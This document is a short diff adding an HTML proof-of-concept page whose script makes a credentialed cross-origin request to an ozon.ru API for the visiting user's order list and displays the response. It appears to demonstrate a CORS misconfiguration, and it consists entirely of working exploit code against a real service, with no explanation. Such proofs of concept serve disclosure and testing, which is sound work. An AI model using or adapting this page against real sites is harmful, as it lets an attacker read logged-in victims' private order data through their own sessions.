@@ -1,0 +1,5 @@
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://www.ozon.ru/api/composer-api.bx/page/json/v2?url=%2Fmy%2Forderlist%3Fpage_changed%3Dtrue',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+  </script>
+</html>
